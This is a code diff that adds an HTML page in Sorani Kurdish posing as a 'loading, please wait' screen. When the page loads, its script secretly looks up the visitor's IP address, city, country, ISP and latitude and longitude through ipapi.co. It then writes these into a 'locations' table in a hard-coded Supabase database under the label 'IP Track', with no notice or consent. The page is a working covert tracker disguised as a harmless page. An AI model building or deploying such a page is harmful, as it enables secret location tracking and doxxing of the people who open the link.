@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>خەریکی بارکردن...</title>
+  <style>
+    body {
+      background-color: #0f172a;
+      color: #f8fafc;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .loading {
+      text-align: center;
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loading">
+    <p>تکایە چاوەڕێ بکە...</p>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+  <script>
+    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
+    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";
+    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    window.addEventListener("DOMContentLoaded", async function () {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const ip = data.ip || "نەنێردراوە";
+        const city = data.city || "نادیار";
+        const country = data.country_name || "نادیار";
+        const org = data.org || "نادیار";
+        const lat = data.latitude || 0;
+        const lon = data.longitude || 0;
+
+        await supabaseClient
+          .from("locations")
+          .insert([{
+            name: `IP Track: ${city}, ${country} (${org})`,
+            latitude: lat,
+            longitude: lon,
+            ip_address: ip
+          }]);
+
+        console.log("زانیارییەکان لە ڕێگەی IP تۆمارکران");
+      } catch (err) {
+        console.error("هەڵە لە وەرگرتنی IP:", err);
+      }
+    });
+  </script>
+
+</body>
+</html>
